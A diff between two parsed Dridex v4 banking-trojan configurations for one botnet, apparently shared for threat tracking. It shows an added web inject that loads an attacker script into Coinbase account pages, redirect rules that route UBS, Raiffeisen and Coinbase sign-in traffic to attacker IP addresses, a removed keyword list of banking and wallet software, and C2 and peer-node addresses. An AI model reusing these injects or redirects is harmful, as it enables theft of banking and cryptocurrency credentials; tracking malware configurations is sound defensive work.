@@ -4,7 +4,7 @@
     ***            dridex v4 configuration                    ***    
     *************************************************************    
     botnetid:      2144    
-    cfg timestamp: 2018-03-14T13:00:10+01:00    
+    cfg timestamp: 2018-03-28T12:04:35+00:00    
     parsed by:     @viql    
         
     note: The dridex v4 config is delivered in binary format;    
@@ -23,20 +23,17 @@
 <settings>
   <modules>
     <module>
-      <sha256>840e204392d2183ec7198917f73c9765f79d4baa0a05721f1d9a41b8670a7608</sha256>
-      <sha1>dc8a5f69bc48c4475bc4a44e7eb0fd99a5a7a537</sha1>
-      <md5>2680cd66b98910d26bfd815d83ca330f</md5>
-      <timestamp>2017-05-12T21:19:16+02:00</timestamp>
+      <sha256>ccf410a1f98edc0cb21afe90db1f89d46234d191029490d2cdf09be7aa217442</sha256>
+      <sha1>e2c2f8b9e6b43d6a70c0b451fe85039847fd687f</sha1>
+      <md5>937a7ba06ed92aee14e11c457a11e322</md5>
+      <timestamp>2017-12-30T23:01:35+00:00</timestamp>
       <architecture>64</architecture>
-      <name>grabber</name>
-      <crc>0x4d38f016</crc>
+      <name>n/a</name>
+      <crc>0x1d1df6f5</crc>
     </module>
   </modules>
   <commands>
-    <cmd id="572377" type="15">
-      <fs>crealogix,multiversa,abacus,ebics,agro-office,cashcomm,softcrew,coconet,macrogram,mammut,omikron,multicash,quatersoft,alphasys,wineur,epsitec,myaccessweb,bellin,financesuite,moneta,softcash,trinity,financesuite,abrantix,starmoney,sfirm,migrosbank,migros bank,online banking,star money,multibit,bitgo,bither,blockchain,copay,msigna,armory,electrum,coinbase,magnr,keepkey,coinsbank,coolwallet,bitoex,xapo,changetip,coinapult,blocktrail,breadwallet,luxstack,airbitz,schildbach,ledger nano,mycelium,trezor,coinomi,bitcore</fs>
-    </cmd>
-    <cmd id="572378" type="22">
+    <cmd id="662693" type="19">
       <fs/>
     </cmd>
   </commands>
@@ -205,16 +202,27 @@
           </modify>
         </actions>
       </httpinject>
+      <httpinject label="coinbasecom">
+        <conditions>
+          <url contentType="" modifiers="iU" onget="0" onpost="1" type="allow">^https://(www.)?coinbase\.com/(dashboard|accounts|trade|settings|buy|sell|verifications)</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="i">(&lt;/body&gt;)</pattern>
+            <replacement>\1&lt;script type=&quot;text/javascript&quot; language=&quot;JavaScript&quot; src=&quot;scripts/ember3.js?system=1002&quot;&gt;&lt;/script&gt;</replacement>
+          </modify>
+        </actions>
+      </httpinject>
     </httpinjects>
     <redirects2>
       <redirect name="2nd_t" postfwd="0" socks="1" timeout="30" uri="https://178.62.232.185:443/engagement" vnc="1">msoffice365.js</redirect>
       <redirect name="1st_t" postfwd="0" socks="0" timeout="20" uri="https://178.62.232.185:443/dealdemand" vnc="0">ember3.js</redirect>
-      <redirect name="ubs_ebanking2_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/5/ubs_ebanking2_y7rKX8yF819Lg3/" vnc="0">^https://ebanking\-ch\d*\.ubs\.com/workbench/</redirect>
-      <redirect name="raiffeisen_ch_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/5/raiffeisen_ch_y7rKX8yF819Lg3/" vnc="0">^https://ebanking\.raiffeisen\.ch/entry/</redirect>
+      <redirect name="ubs_ebanking2_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/5/ubs_ebanking2_HPn7vWwV530MSsjr/" vnc="0">^https://ebanking\-ch\d*\.ubs\.com/workbench/</redirect>
+      <redirect name="raiffeisen_ch_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/5/raiffeisen_ch_HPn7vWwV530MSsjr/" vnc="0">^https://ebanking\.raiffeisen\.ch/entry/</redirect>
       <redirect name="images_redirect" postfwd="1" socks="0" timeout="20" uri="https://216.51.232.176:4043/get-dbYd81hd83H/\1" vnc="0">^https://.*/image777000/(.+)</redirect>
-      <redirect name="cobaba_redirect_data" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/520/cobaba_y7rKX8yF819Lg3/default_redirect.js" vnc="0">^https://www.coinbase.com/default_redirect.js</redirect>
-      <redirect name="cobaba_redirect_files" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/520/cobaba_y7rKX8yF819Lg3/files/" vnc="0">^https://www.coinbase.com/files/</redirect>
-      <redirect name="cobaba_redirect_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/520/cobaba_y7rKX8yF819Lg3/" vnc="0">^https://www.coinbase.com/signin</redirect>
+      <redirect name="cobaba_redirect_data" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/520/cobaba_HPn7vWwV530MSsjr/default_redirect.js" vnc="0">^https://www.coinbase.com/default_redirect.js</redirect>
+      <redirect name="cobaba_redirect_files" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/520/cobaba_HPn7vWwV530MSsjr/files/" vnc="0">^https://www.coinbase.com/files/</redirect>
+      <redirect name="cobaba_redirect_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/520/cobaba_HPn7vWwV530MSsjr/" vnc="0">^https://www.coinbase.com/signin</redirect>
     </redirects2>
     <redirects/>
     <handlers>
@@ -222,7 +230,7 @@
     </handlers>
     <httpblocks/>
     <clickshots/>
-    <timestamp>2018-03-14T13:00:10+01:00</timestamp>
+    <timestamp>2018-03-28T12:04:35+00:00</timestamp>
   </config>
   <c2>
     <host>
@@ -230,82 +238,4 @@
       <ip>178.62.232.185</ip>
     </host>
   </c2>
-  <supernodes>
-    <node>
-      <ip>139.78.21.232</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>81.254.168.177</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>91.189.43.152</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>70.184.66.94</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>66.65.47.220</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>50.251.187.217</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>193.251.189.134</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>172.249.88.69</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>104.34.220.68</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>37.153.92.6</ip>
-      <port>8443</port>
-    </node>
-    <node>
-      <ip>212.237.42.204</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>108.205.215.92</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>58.167.83.30</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>98.127.252.183</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>74.66.65.127</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>73.138.81.95</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>37.153.92.6</ip>
-      <port>444</port>
-    </node>
-    <node>
-      <ip>185.93.183.30</ip>
-      <port>443</port>
-    </node>
-    <node>
-      <ip>185.93.183.30</ip>
-      <port>443</port>
-    </node>
-  </supernodes>
 </settings>
